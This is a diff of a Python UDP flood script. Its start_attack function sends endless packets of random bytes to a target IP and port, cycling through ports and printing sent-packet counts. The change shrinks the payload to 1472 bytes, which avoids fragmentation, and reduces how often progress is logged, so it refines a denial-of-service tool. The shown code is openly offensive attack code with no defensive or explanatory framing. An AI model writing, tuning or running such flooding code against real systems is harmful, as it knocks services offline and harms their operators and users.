@@ -77,7 +77,7 @@ def loading_animation():
 
 def start_attack(ip, port, show_all=False):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = random._urandom(1490)
+    payload = random._urandom(1472)
     sent = 0
     try:
         while True:
@@ -87,7 +87,7 @@ def start_attack(ip, port, show_all=False):
             if port > 65534:
                 port = 1
 
-            if show_all or sent % 10000 == 0:
+            if show_all or sent % 100000 == 0:
                 now = datetime.now().strftime("%H:%M:%S")
                 print(f"[{now}] Sent {sent} packets to {ip} through port {port}")
     except KeyboardInterrupt:
